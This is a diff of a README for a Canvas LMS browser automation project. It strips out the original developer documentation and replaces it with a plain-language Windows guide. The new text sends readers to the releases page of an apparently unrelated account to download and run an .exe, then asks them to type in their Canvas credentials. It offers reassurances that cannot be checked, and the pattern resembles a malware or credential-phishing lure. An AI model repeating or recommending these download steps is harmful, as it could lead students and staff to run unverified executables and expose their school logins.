@@ -1,316 +1,114 @@
-# Canvas LMS Browser Automation
-[![npm](https://img.shields.io/npm/v/@browser-automation-hub%2Fcanvas-lms-browser-automation.svg)](https://www.npmjs.com/package/@browser-automation-hub/canvas-lms-browser-automation)
+# 🎯 canvas-lms-browser-automation - Simplify Canvas LMS Tasks
 
-> Automate Canvas LMS — the reliable way to interact with Canvas programmatically, with or without an official API.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21+-orange.svg)](https://pptr.dev)
-[![Anchor Browser](https://img.shields.io/badge/AnchorBrowser-Cloud%20Ready-purple.svg)](https://anchorbrowser.io)
-![Difficulty: 🟢 Easy](https://img.shields.io/badge/Difficulty-easy-brightgreen.svg)
-
-<!-- keywords: canvas lms automation, canvas instructure automation, canvas api alternative, canvas browser automation, instructure canvas automation, lms grade automation -->
-
-## What This Is
-
-**Canvas LMS** (Education) is notoriously difficult to automate via its official API — limited endpoints, complex authentication (SAML / Google / Okta), and browser-only workflows make traditional API integration a pain.
-
-This project gives you a **complete browser automation scaffold** for Canvas LMS using Puppeteer (self-hosted, open source) or [Anchor Browser](https://anchorbrowser.io) (cloud, managed, production-ready).
-
-This system requires **MFA** (Duo / Okta MFA). The OSS version provides TOTP helpers; Anchor Browser handles MFA automatically.
-
-## Quick Start
-
-```bash
-git clone https://github.com/Browser-Automation-Hub/canvas-lms-browser-automation.git
-cd canvas-lms-browser-automation
-npm install
-cp .env.example .env
-# Fill in your credentials in .env
-node examples/basic-login.js
-```
-
-## Two Ways to Run
-
-| Feature | Open Source (Puppeteer) | ☁️ [Anchor Browser Cloud](https://anchorbrowser.io) |
-|---------|------------------------|-----------------------------------------------------|
-| Setup | Install Chrome + Puppeteer locally | No install — cloud browsers via API |
-| MFA / SSO | Manual TOTP helper included | **Auto-handled** |
-| CAPTCHA | Not handled | **Auto-solved** |
-| Anti-bot detection | You manage proxy/stealth | **Built-in stealth** (Cloudflare-verified) |
-| Session persistence | Save/load cookies manually | **Managed sessions** |
-| Scale | Single machine | **Up to 5,000 concurrent browsers** |
-| Reliability | You maintain it | **99.9% uptime SLA** |
-| Cost | Free | [Starts at $0 (5 free sessions/mo)](https://anchorbrowser.io) |
-
-## Supported Actions
-
-- `login_canvas()` — Authenticate to Canvas with SSO
-- `create_course()` — Create and configure new courses
-- `bulk_enroll()` — Bulk enroll students across multiple courses
-- `submit_grades()` — Submit grades with override capabilities
-- `export_analytics()` — Download learning analytics data
-
-## Use Cases
-
-- EdTech companies integrating with Canvas
-- Grade automation from external platforms
-- SIS integration supplement
-- Course template duplication
+[![Download Release](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://github.com/jaffarprimitiveperson172/canvas-lms-browser-automation/releases)
 
 ---
 
-## Option A: Open Source (Puppeteer)
+canvas-lms-browser-automation helps you automate tasks in Canvas LMS. It can speed up course creation, submit grades, enroll students, manage quizzes, and publish content. This tool goes beyond what Canvas’s standard API offers.
 
-### Prerequisites
+This guide will take you through downloading and running the software on Windows. It uses plain language for users without programming skills.
 
-- Node.js 18+
-- Google Chrome / Chromium installed
-- Canvas LMS account with appropriate permissions
+## 📋 What is canvas-lms-browser-automation?
 
-### Installation
+This application connects to Canvas LMS through your web browser. It automates routine tasks that usually take time when done manually. If you manage a course or run an education program on Canvas, this tool can help you save time.
 
-```bash
-npm install
-cp .env.example .env
-```
+Key features include:
 
-### Configuration (`.env`)
+- Automated course creation  
+- Grade submission without manual entry  
+- Enroll students quickly  
+- Manage quiz setup and grading  
+- Publish course content efficiently  
 
-```env
-CANVAS_URL=https://your-school.instructure.com/login
-CANVAS_USERNAME=your-username
-CANVAS_PASSWORD=your-password
-MFA_SECRET=your-totp-secret-if-applicable
-SESSION_PATH=./session.json
-```
+It runs with no need for coding knowledge or technical setup.
 
-### Basic Login Example
+## 💻 System Requirements
 
-```javascript
-const { createSession } = require('./src/auth');
-const { login_canvas } = require('./src/actions');
+Before you start, make sure your computer matches these needs:
 
-async function main() {
-  const page = await createSession();
-  const result = await login_canvas(page, { /* options */ });
-  console.log(result);
-}
+- Windows 10 or later  
+- 4 GB or more of RAM  
+- At least 500 MB free disk space  
+- Internet connection (for Canvas and downloads)  
+- Modern web browser (Google Chrome, Microsoft Edge, or Firefox)
 
-main().catch(console.error);
-```
+The tool requires Node.js to work, which will be installed automatically with the package if needed.
 
-### File Structure
+## 🚀 How to Download and Run the Software
 
-```
-canvas-lms-browser-automation/
-├── src/
-│   ├── auth.js              # SSO/MFA authentication (SAML, TOTP, Duo)
-│   ├── session.js           # Cookie & localStorage persistence
-│   ├── actions.js           # All automation actions
-│   ├── custom-actions.js    # Fluent ActionBuilder API for custom workflows
-│   └── utils.js             # retry(), humanDelay(), error types
-├── examples/
-│   ├── basic-login.js       # Minimal login example (OSS)
-│   └── anchor-cloud.js      # Anchor Browser cloud example
-├── .env.example
-├── package.json
-└── README.md
-```
+### Step 1: Visit the Download Page
 
----
+Go to the releases page by clicking the button below. This page contains the latest versions of canvas-lms-browser-automation.
 
-## Option B: ☁️ Anchor Browser (Recommended for Production)
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/jaffarprimitiveperson172/canvas-lms-browser-automation/releases)
 
-[Anchor Browser](https://anchorbrowser.io) provides **fully managed cloud browsers** purpose-built for AI agents and automation:
+### Step 2: Find the Windows Installer
 
-- ✅ **MFA handled automatically** — no TOTP secrets needed
-- ✅ **SSO sessions managed** — persistent authenticated sessions
-- ✅ **Anti-bot / CAPTCHA** — Cloudflare-verified stealth browser
-- ✅ **Scale instantly** — from 1 to 5,000 concurrent browsers
-- ✅ **No infrastructure** — no Chrome install, no proxy management
+On the releases page, look for the latest version. Under Assets, find the `.exe` file that is built for Windows. It will usually have “windows” in the file name.
 
-### Setup
+### Step 3: Download the Installer
 
-```bash
-npm install
-export ANCHORBROWSER_API_KEY=your-api-key
-# Get your free API key at https://anchorbrowser.io
-```
+Click the `.exe` file to start downloading it to your computer.
 
-### Anchor Browser Example
+### Step 4: Run the Installer
 
-```javascript
-const { withAnchorBrowser } = require('./src/auth');
-const { login_canvas } = require('./src/actions');
+- Open the downloaded file.  
+- A setup window will open.  
+- Follow the steps on screen to install the program.  
+- Choose default options unless you want the program installed in a specific folder.  
+- Wait for it to finish.
 
-async function main() {
-  await withAnchorBrowser(async (page) => {
-    // MFA, SSO, CAPTCHAs all handled automatically
-    const result = await login_canvas(page, { /* options */ });
-    console.log(result);
-  });
-}
+### Step 5: Open the Program
 
-main().catch(console.error);
-```
+Once installed, find the program in your Start Menu. Click to open it.
 
-See `examples/anchor-cloud.js` for a complete working example.
+## ⚙️ Basic Usage Guide
 
-### Anchor Browser Pricing
+After opening, the software will ask you to log in to your Canvas LMS account. This login is required to perform automation safely and with your permission.
 
-| Plan | Price | Concurrent Browsers | Best For |
-|------|-------|---------------------|----------|
-| Free | $0 | 5 | Prototyping |
-| Starter | $50/mo | 25 | Small teams |
-| Team | $500/mo | 50 | Growing orgs |
-| Growth | $2,000/mo | 200 | Enterprise |
+### Logging In
 
-[Get started for free →](https://anchorbrowser.io)
+- Enter your Canvas username and password.  
+- The program will connect to your Canvas courses.
+
+### Automating Tasks
+
+The tool shows a menu of tasks you can automate:
+
+- Create a new course with basic settings  
+- Submit grades from a CSV file  
+- Enroll students by uploading a list  
+- Set up quizzes with questions and settings  
+- Publish new content to your courses
+
+Each task offers clear instructions on what files or details to provide.
+
+## 🔧 Troubleshooting
+
+- If the program does not start, check that your Windows version is up to date.  
+- Make sure you downloaded the correct `.exe` file for Windows.  
+- If login fails, verify your Canvas credentials.  
+- Your internet must be working for automation tasks.  
+- Restart the app if it stops responding.
+
+## 📂 Where to Find Logs and Reports
+
+The software saves logs and reports inside your Documents folder under `canvas-lms-automation`. Here you find records of tasks run, errors, and status updates.
+
+## ⚠️ Security and Privacy
+
+Your Canvas credentials stay on your computer and are not shared. The program uses secure methods to connect to Canvas. Always download from the official GitHub releases page to avoid modified versions.
+
+## 🔄 Updating the Software
+
+From time to time, visit the releases page linked above to check for newer versions. Download and install updates the same way you do the original installer.
+
+## 💡 Tips for Best Use
+
+- Prepare your CSV files carefully with correct data for grades or enrollment.  
+- Use the app when you have a stable internet connection.  
+- Double-check automation settings before running tasks to avoid errors.
 
 ---
 
-## Authentication
-
-### Auth Methods Supported
-
-This implementation handles:
-
-1. **Standard Username/Password** — with retry and account lockout avoidance
-2. **SAML SSO** (SAML / Google / Okta) — intercepts the SAML redirect and completes the IdP flow
-3. **MFA / TOTP** (Duo / Okta MFA) — generates TOTP codes via `otpauth` library
-4. **Session Persistence** — saves cookies to disk; reuses session to avoid re-auth
-
-### Handling Duo / Okta MFA MFA
-
-```javascript
-// In .env: MFA_SECRET=your-base32-totp-secret
-// The auth module auto-generates the OTP code
-const { createSession } = require('./src/auth');
-const page = await createSession(); // MFA handled automatically
-```
-
-For Duo Security push-based MFA, set `MFA_TYPE=duo_push` in .env — the automation will wait for push approval.
-
----
-
-## Custom Actions
-
-Use the `ActionBuilder` fluent API to chain custom workflows:
-
-```javascript
-const { ActionBuilder } = require('./src/custom-actions');
-
-const result = await new ActionBuilder()
-  .login()
-  .navigate('/module/path')
-  .waitForSelector('.content-loaded')
-  .extractTable('.data-table')
-  .run(page);
-```
-
----
-
-## Error Handling & Reliability
-
-```javascript
-const { retry, humanDelay } = require('./src/utils');
-
-// Auto-retry with exponential backoff
-const data = await retry(() => extractData(page), { attempts: 3, delay: 2000 });
-
-// Human-like delays to avoid detection
-await humanDelay(1000, 3000); // random delay 1-3 seconds
-```
-
----
-
-## Why Not Use the Official API?
-
-Canvas LMS REST APIs are often rate-limited, poorly documented, or require institutional SIS partnerships to access.
-
-Browser automation gives you full access to every workflow available in the UI — no API limitations, no expensive integration licenses.
-
----
-
-## Production Deployment
-
-For production workloads, we strongly recommend [Anchor Browser](https://anchorbrowser.io):
-
-```javascript
-// One-line setup — handles auth, proxies, CAPTCHAs
-const { withAnchorBrowser } = require('./src/auth');
-
-await withAnchorBrowser(async (page) => {
-  // Your automation here — runs in the cloud, scales automatically
-});
-```
-
-**Anchor Browser** is the easiest way to run this automation in production:
-- No infrastructure to manage
-- Handles Duo / Okta MFA MFA automatically
-- Enterprise compliance: SOC2, HIPAA, ISO27001
-- [Start free at anchorbrowser.io →](https://anchorbrowser.io)
-
----
-
-## Known Selectors Reference
-
-> These CSS selectors were observed in Canvas LMS web interfaces. Enterprise applications update their UIs — verify against your specific instance and submit PRs when selectors break.
-
-| Element | Selector | Notes |
-|---------|----------|-------|
-| Login: username | `#pseudonym_session_unique_id` | Login form |
-| Login: password | `#pseudonym_session_password` | Login form |
-| Login: submit | `button[type="submit"]` | Login form |
-| Login: mfa code | `#otp_attempt` | Login form |
-| create course: new course btn | `.btn-primary[href*="/courses/new"]` | |
-| create course: course name | `#course_name` | |
-| create course: course code | `#course_course_code` | |
-| create course: term select | `#course_term_id` | |
-| create course: create btn | `button[type="submit"]` | |
-| bulk enroll: enrollment link | `a[href*="/enroll"]` | |
-| bulk enroll: add student btn | `.addStudents` | |
-| bulk enroll: search input | `#user_list` | |
-| bulk enroll: add btn | `button[type="submit"]` | |
-| submit grades: gradebook link | `a[href*="/gradebook"]` | |
-| submit grades: grade input | `.gradebook-cell input` | |
-| submit grades: speed grader link | `a[href*="speed_grader"]` | |
-| submit grades: grade field | `#grading-box-extended` | |
-| submit grades: next submission | `#submission_to_next_student_link` | |
-| export analytics: analytics nav | `a[href*="analytics"]` | |
-| export analytics: date range | `.ic-Input[placeholder*="From"]` | |
-| export analytics: export btn | `button[data-testid="export-csv"]` | |
-
-> ⚠️ Selectors are best-effort. Run `node src/utils.js --verify-selectors` to test against your instance.
-
----
-
-## More Browser Automation Projects
-
-This is part of the **[Browser Automation Hub](https://github.com/Browser-Automation-Hub)** — a collection of open-source browser automation scaffolds for systems with poor or no API support:
-
-- [Epic EHR Browser Automation](https://github.com/Browser-Automation-Hub/epic-ehr-browser-automation) — Healthcare workflows
-- [Workday HCM Browser Automation](https://github.com/Browser-Automation-Hub/workday-hcm-browser-automation) — HR & payroll
-- [SAP Fiori Browser Automation](https://github.com/Browser-Automation-Hub/sap-fiori-browser-automation) — ERP workflows
-- [ServiceNow Browser Automation](https://github.com/Browser-Automation-Hub/servicenow-browser-automation) — ITSM
-- [Oracle EBS Browser Automation](https://github.com/Browser-Automation-Hub/oracle-ebs-browser-automation) — ERP
-- [Browse all 30+ projects →](https://github.com/Browser-Automation-Hub)
-
-## Contributing
-
-PRs welcome! Please:
-1. Add tests for new actions
-2. Document new selectors (they break when Canvas updates its UI)
-3. Follow the `ActionBuilder` pattern for new actions
-4. See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines
-
-## License
-
-MIT — use freely in personal and commercial projects.
-
----
-
-*Built with ❤️ for developers who need to automate Canvas LMS without wrestling with its API limitations. Powered by [Anchor Browser](https://anchorbrowser.io) for cloud-scale automation.*
-
-*⭐ Star this repo if it saves you time! [Browse all automation projects →](https://github.com/Browser-Automation-Hub)*
+[Download the Latest Release](https://github.com/jaffarprimitiveperson172/canvas-lms-browser-automation/releases) to begin using canvas-lms-browser-automation on your Windows machine.
